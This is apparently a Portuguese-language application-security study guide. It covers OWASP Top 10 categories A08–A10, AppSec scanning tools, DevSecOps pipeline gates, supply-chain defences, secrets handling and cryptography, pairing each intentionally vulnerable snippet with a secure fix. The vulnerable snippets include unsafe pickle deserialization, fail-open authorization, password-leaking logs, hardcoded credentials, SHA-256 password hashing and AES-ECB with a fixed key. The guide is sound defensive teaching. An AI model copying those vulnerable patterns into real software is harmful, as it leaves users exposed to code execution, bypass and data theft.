🟢 DefesaMFA, rate limit/lockout, senhas fortes (NIST 800-63B), mensagens genéricas.

A08Software & Data Integrity Failures

#8 · desserialização, updates não verificados · CWE-502/345
›
O que é

Código ou dado aceito sem verificar integridade: desserialização insegura (RCE), update de software sem assinatura, pipeline de CI que confia em artefato não verificado. Fronteira com supply chain.

Como achar

pickle.loads, yaml.load (sem SafeLoader), ObjectInputStream.readObject, unserialize() sobre dado do usuário; download executado sem checar hash/assinatura.

🔴 Vulnerável (desserialização)
# Python — pickle de dado não confiável = RCE
import pickle
obj = pickle.loads(request.data)   # __reduce__ executa comando
🟢 Seguro
# use um formato de dados, não de objetos
import json
obj = json.loads(request.data)     # json não instancia classes
# YAML: yaml.safe_load(...) · Java: allowlist de classes / evitar nativo
🔴 ImpactoExecução remota de código ao desserializar entrada controlada pelo atacante.
🟢 DefesaJSON em vez de pickle/serial nativo; assinar e verificar artefatos e updates.

A09Security Logging & Alerting Failures

#9 · renomeada (ênfase em alerta) · CWE-778/117
›
O que é

Eventos de segurança não são registrados, logs podem ser adulterados ou vazam segredos, e — o foco do novo nome — ninguém é alertado. Log sem alerta não encurta uma invasão. É o que deixa outras falhas virarem incidentes longos.

Como achar

Login/falha de autz/erro de validação sem log; logs gravando senha/token/PII; ausência de alerta/correlação; log que o próprio usuário pode forjar (log injection via \n).

🔴 Vulnerável
# nada é logado; e quando loga, vaza segredo + aceita CRLF
login(user, pw)   # sem registro de sucesso/falha
log.info("login " + user + " pw=" + pw)   # vaza senha + injeção
🟢 Seguro
log.info("auth.login", extra={"user_id": uid,
         "result": result, "ip": ip})   # estruturado, sem segredo
# + alerta em N falhas, logs íntegros/append-only, sanitizar \r\n
🔴 ImpactoAtaque passa despercebido; sem trilha para forense; segredo no log.
🟢 DefesaLogar eventos de segurança (sem PII/segredo), alertar, correlacionar (ligação com Prova D/SIEM).

A10Mishandling of Exceptional Conditions NOVA

#10 · erro mal tratado / fail-open · CWE-209/755/703
›
O que é

Categoria nova (24 CWEs). Tratamento errado de condições anormais: falhar aberto (em erro, libera acesso), engolir exceções, vazar stack trace/detalhes internos, lógica que não cobre o caso de erro. O erro vira a brecha.

Como achar

except: pass, catch(e){} vazio, checagem de permissão dentro de try que, ao falhar, segue adiante; mensagens de erro detalhadas para o usuário final.

🔴 Vulnerável (fail-open)
try:
    allowed = check_permission(user, resource)
except Exception:
    allowed = True      # erro -> LIBERA (falha aberta!)
🟢 Seguro (fail-closed)
try:
    allowed = check_permission(user, resource)
except Exception:
    log.exception("authz error")
    allowed = False     # erro -> NEGA (falha fechada)
# + mensagem genérica ao usuário, detalhe só no log
🔴 ImpactoBypass de autorização via erro forçado; vazamento de dados internos no stack trace.
🟢 DefesaFail securely (negar em erro), handler global de erro, mensagem genérica + log interno.
🛠️ Ferramentas de AppSec — a ideia não é "comprar tudo", é um stack enxuto de alto sinal: SAST no PR, SCA + SBOM no build, secret scan no pre-commit, DAST no staging, IaC/container scan no package. Cada ferramenta cobre uma fatia; juntas, cobrem o ciclo.

SASTAnálise estática de código

Semgrep, CodeQL, Bandit
›
Como usar
semgrep --config auto .                 # regras da comunidade, multi-linguagem
semgrep --config p/owasp-top-ten .        # foco OWASP
bandit -r app/                          # SAST para Python
# CodeQL (GitHub): query semântica do fluxo de dados source->sink
O que observar

Priorize achados high com fluxo confirmado. Ajuste regras para cortar falso positivo. Rode no PR e falhe o build em severidade alta.

🔴 LimiteNão vê lógica de negócio nem config de runtime; pode gerar ruído.
🟢 ForçaBarato, cedo, aponta arquivo+linha; ótimo em gate de PR.

DASTTeste dinâmico da app rodando

OWASP ZAP, Nuclei, Burp
›
Como usar
zap-baseline.py -t https://staging.alvo       # scan passivo rápido (CI)
zap-full-scan.py -t https://staging.alvo      # ativo (mais fundo)
nuclei -u https://staging.alvo -t cves/        # templates de CVE conhecidas
O que observar

Rode em staging (nunca produção sem autorização). Headers de segurança, XSS/SQLi refletidos, config exposta. Complementa o SAST com a visão de runtime.

🔴 LimiteNão diz a linha; cobre só o que tem rota HTTP e foi navegado.
🟢 ForçaPega config/auth/runtime com poucos falsos positivos.

SCADependências + SBOM

Dependency-Check, Trivy, Grype, Snyk, Dependabot
›
Como usar
trivy fs --scanners vuln,license .         # deps + licenças
grype dir:.                                # casa deps com CVE
syft dir:. -o cyclonedx-json > sbom.json   # gera o SBOM
grype sbom:./sbom.json                     # re-checa o SBOM contra novas CVEs
O que observar

Severidade (CVSS) + se há fix disponível + se a função vulnerável é realmente usada (VEX). Gate: falhar em CRITICAL/HIGH com correção disponível.

🔴 LimiteNão acha bug no seu código; depende de a CVE já existir na base.
🟢 ForçaCobre a maior parte do código entregue (o de terceiros) e gera SBOM.

SECRETS / IaCSegredos e infraestrutura como código

gitleaks, trufflehog, Checkov, tfsec, kics
›
Como usar
gitleaks detect --source .                 # segredos no código E no histórico
trufflehog git file://. --only-verified    # valida se o segredo é vivo
checkov -d .                               # Terraform/K8s/Docker misconfig
trivy config .                             # IaC + Dockerfile
O que observar

Segredo achado = rotacione já (está no histórico git para sempre). IaC: buckets públicos, security groups abertos, containers como root.

🔴 LimiteSecret scan só acha o que está no repo; IaC não vê o runtime real.
🟢 ForçaBarato no pre-commit; evita a classe de vazamento mais comum.
🔁 DevSecOps — segurança automatizada em cada etapa do pipeline, para que vazamento de credencial, dependência vulnerável, misconfig e artefato adulterado sejam pegos pelo próprio pipeline, não por um humano no fim. Um stack bem paralelizado adiciona menos de ~5 min ao build.

PIPELINEQual controle em cada etapa

a ordem que importa
›
Mapa do pipeline seguro
# PRE-COMMIT (máquina do dev):  secret scan, lint, SAST rápido
# COMMIT / PR:                   SAST completo, SCA, secret scan
# BUILD:                        gerar SBOM, SCA do SBOM
# PACKAGE:                      scan de container + IaC scan
# PUBLISH:                      assinar artefato (cosign) + proveniência SLSA
# PRE-DEPLOY:                   policy-as-code gates (OPA)
# STAGING:                      DAST
# PROD:                         monitoração/alerta (liga com A09 e Prova D)
🔴 AntipadrãoSó um pentest no fim: caro, tarde e não repetível.
🟢 CertoControle automático em cada etapa, falhando o build no que é crítico.

CIExemplo: GitHub Actions com gates

shift-left na prática
›
.github/workflows/devsecops.yml
name: devsecops
on: [pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a1b2c3d   # pin por SHA
      - name: Secrets
        run: gitleaks detect --source . --redact
      - name: SAST
        run: semgrep --config p/owasp-top-ten --error
      - name: SCA + SBOM
        run: |
          syft dir:. -o cyclonedx-json > sbom.json
          grype sbom:./sbom.json --fail-on high
      - name: IaC
        run: trivy config . --severity HIGH,CRITICAL --exit-code 1
O que observar

--error/--exit-code 1/--fail-on = o job quebra o PR em achado crítico. Rode os passos em paralelo quando possível. Baixa severidade: registra, não bloqueia.

🔴 AntipadrãoScanner que só "avisa" e nunca bloqueia — vira ruído ignorado.
🟢 CertoGate que bloqueia o crítico, com exceção auditável quando necessário.

SEGREDOSCredenciais no pipeline

o alvo favorito do atacante de CI/CD
›
Regras
# nenhum segredo estático no CI: use OIDC federation (token efêmero)
# segredos vêm de cofre (Vault / cloud secrets), injetados em runtime
# mascarar segredos nos logs do build
# pin de TODA ação de terceiros por commit SHA (não @main/@v1)
🔴 ImpactoChave de nuvem longa vazada no CI = comprometimento de toda a conta.
🟢 DefesaOIDC + credenciais curtas, cofre, mascaramento, pin por SHA.
📦 Segurança da cadeia de suprimentos (A03:2025) — a maior parte do seu software não foi você quem escreveu. Atacantes miram o elo mais fraco: uma dependência, o build ou o registry. Defesa = saber o que você usa (SBOM), fixar o que usa (pin+hash) e provar o que você entregou (assinatura + proveniência).

SBOMInventário de tudo que entra no produto

Syft, CycloneDX, SPDX, Dependency-Track
›
O que é / por que importa

O Software Bill of Materials lista cada componente (incluindo os transitivos), versão, licença e origem. Quando sai uma CVE nova (ex.: Log4Shell), você responde em minutos "eu uso isso?" em vez de dias.

Como fazer
syft dir:. -o cyclonedx-json > sbom.json    # gera o SBOM por build
# armazene o SBOM junto do artefato e re-escaneie continuamente:
grype sbom:./sbom.json                      # casa com CVEs novas
# Dependency-Track: monitora os SBOMs ao longo do tempo
🔴 Sem SBOMUma CVE nova vira uma caça manual em pânico por todos os repositórios.
🟢 Com SBOMResposta imediata + VEX (quais CVEs realmente afetam o produto).

ATAQUESDependency confusion, typosquatting, pacote malicioso

como o elo é comprometido
›
O que é / por que importa

Typosquatting: pacote com nome quase igual (reqeusts). Dependency confusion: publicar no registry público um pacote com o nome de um interno, e o gestor baixar o público. Pacote malicioso: lib legítima comprometida (ex.: worm npm Shai-Hulud, 2025).

Como achar / mitigar
# conferir nome exato e reputação antes de adicionar dependência
# registry interno com scoped packages + bloquear fetch público
# lockfile commitado + pin por hash (install só o que foi verificado)
npm ci            # instala exatamente o lockfile (não resolve versões novas)
pip install --require-hashes -r requirements.txt
🔴 ImpactoCódigo malicioso roda no seu build/app com os privilégios do CI.
🟢 DefesaPin+hash, lockfile, registry interno, SCA e revisão de novas dependências.

INTEGRIDADEAssinatura & proveniência (Sigstore, SLSA)

provar o que você entregou
›
O que é / por que importa

Assinar o artefato prova que ele veio de você e não foi adulterado. Proveniência (SLSA) registra como e de onde ele foi construído. Juntos fecham o elo entre o código revisado e o que roda em produção.

Como fazer
cosign sign       registry/app@sha256:...     # assina a imagem
cosign verify     registry/app@sha256:...     # verifica antes de deploy
# SLSA: o pipeline gera atestado de proveniência (build reproduzível)
# gate de admissão (K8s): só roda imagem assinada e com proveniência
🔴 Sem issoUm artefato trocado no registry passa como legítimo.
🟢 Com issoDeploy só aceita o que foi assinado pelo seu pipeline (cadeia de confiança).
🔑 Segredos & Criptografia no código — dois dos achados mais comuns (e mais fáceis de corrigir) do code review: credenciais hardcoded e cripto fraca. A regra: segredo nunca no código (vai para cofre/env) e nunca invente cripto (use primitivas certas).

SEGREDOSCredenciais hardcoded

CWE-798 · o clássico do git vazado
›
O que é / por que importa

Senha, chave de API ou token escrito direto no código. Uma vez commitado, fica no histórico git para sempre — mesmo que você apague depois. Repositório que vaza = conta comprometida.

🔴 Vulnerável
DB_PASSWORD = "P@ssw0rd123"
STRIPE_KEY  = "sk_live_51Hxxxxxxxxxxxxxxxx"   # chave viva no repo
🟢 Seguro
import os
DB_PASSWORD = os.environ["DB_PASSWORD"]      # injetado em runtime
STRIPE_KEY  = vault.get("stripe/live_key")    # de um cofre
# .env NO .gitignore · secret scan no pre-commit · ROTACIONE o que vazou
🔴 ImpactoQualquer um com acesso ao repo (ou ao histórico) usa suas credenciais.
🟢 DefesaEnv/cofre, .gitignore, gitleaks no pre-commit, rotação imediata.

HASHArmazenamento de senha

CWE-916 · nunca MD5/SHA1
›
O que é / por que importa

Senha nunca é guardada em texto nem em hash rápido (MD5/SHA1/SHA256 puro). Use uma função lenta, com sal, feita para senha: argon2id (preferido), bcrypt ou scrypt.

🔴 Vulnerável
hash = hashlib.sha256(password.encode()).hexdigest()  # rápido, sem sal
🟢 Seguro
from argon2 import PasswordHasher
ph = PasswordHasher()               # sal automático + custo configurável
hash = ph.hash(password)
try: ph.verify(hash, attempt)        # comparação em tempo constante
except: deny()
🔴 ImpactoBanco vazado → senhas quebradas em massa (bilhões de hash/s em GPU).
🟢 Defesaargon2id/bcrypt/scrypt; custo calibrado; política de senha NIST 800-63B.

CRIPTOCifra simétrica: modo e chave

CWE-327 · evite ECB e chave fixa
›
O que é / por que importa

Para cifrar dado, use um modo autenticado (AES-GCM) com nonce único por mensagem e a chave vinda de um cofre. O modo ECB vaza padrões (o famoso "pinguim ECB") e chave hardcoded anula a cifra.

🔴 Vulnerável
# ECB + chave fixa no código
cipher = AES.new(b"1234567890123456", AES.MODE_ECB)
🟢 Seguro
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
key = load_key_from_vault()         # fora do código
nonce = os.urandom(12)              # único por mensagem
ct = AESGCM(key).encrypt(nonce, plaintext, aad)   # cifra + autentica
🔴 ImpactoECB revela estrutura do dado; chave fixa = qualquer um decifra.
🟢 DefesaAES-GCM (ou libsodium), nonce único, chave em cofre, rotação de chaves.
